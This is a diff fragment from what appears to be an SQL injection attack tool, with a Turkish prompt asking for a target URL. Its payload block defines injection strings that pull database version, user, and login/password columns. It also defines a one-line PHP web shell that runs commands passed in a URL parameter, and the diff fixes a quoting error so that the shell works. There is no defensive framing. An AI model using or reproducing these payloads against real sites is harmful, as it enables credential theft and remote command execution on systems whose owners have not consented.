@@ -15,7 +15,7 @@ by mars
 #payloads
 db_info = "database(),0x3a,version(),0x3a,user()"
 db_creds = "login,0x3a,password"
-web_shell = "<?php system($_GET['cmd]); ?>"
+web_shell = "<?php system($_GET['cmd']); ?>"
 #
 
 print ("Hedef URL Girin")
